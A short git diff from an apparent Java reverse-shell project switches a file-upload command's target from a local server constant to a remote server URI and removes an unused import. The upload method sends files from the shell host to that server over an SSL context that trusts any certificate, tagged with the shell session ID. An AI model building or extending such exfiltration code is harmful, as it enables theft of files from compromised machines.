@@ -8,7 +8,6 @@ import com.mtattab.reverseshell.util.ReverseShellSession;
 import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
 import okhttp3.*;
 
-import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
@@ -73,7 +72,7 @@ public class UploadToS3Command implements Command {
     private Response uploadFile(File fileToUpload) throws IOException {
         SSLContext sslContext= createInsecureSslContext();
 
-        String uri = Constants.LOCAL_SERVER_HTTP_URI+
+        String uri = Constants.SERVER_HTTP_URI +
                 Constants.S3_API_ENDPOINT+
                 Constants.S3_API_UPLOAD+
                 Constants.S3_API_UPLOAD_SESSION_PARAM+ ReverseShellSession.getSessionId();
